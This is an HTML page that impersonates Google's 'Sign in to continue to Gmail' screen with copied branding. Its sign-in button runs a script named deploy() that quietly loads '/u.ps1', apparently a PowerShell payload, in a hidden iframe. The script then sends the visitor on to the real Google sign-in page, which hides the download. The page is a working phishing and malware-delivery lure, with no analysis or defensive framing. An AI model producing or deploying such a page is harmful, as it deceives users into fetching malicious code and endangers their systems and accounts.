<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
<link rel="icon" href="https://accounts.google.com/favicon.ico">
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,sans-serif}body{background:#fff;height:100vh;display:flex;align-items:center;justify-content:center}.container{max-width:400px;padding:40px;text-align:center}.logo{height:24px;margin-bottom:16px}h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}.subtitle{color:#5f6368;font-size:16px;margin-bottom:32px}button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-bottom:16px}button:hover{background:#1557b0}.footer{color:#5f6368;font-size:12px;margin-top:24px}</style>
</head>
<body>
<div class="container">
<img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
<h1>Sign in</h1>
<p class="subtitle">to continue to Gmail</p>
<button onclick="deploy()">Sign in with Google</button>
<div class="footer">Use your Google Account</div>
</div>
<script>
function deploy(){
    const iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='/u.ps1';document.body.appendChild(iframe);
    window.location='https://accounts.google.com/signin/v2/identifier?continue=https://mail.google.com/mail/u/0/&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
}
</script>
</body>
</html>
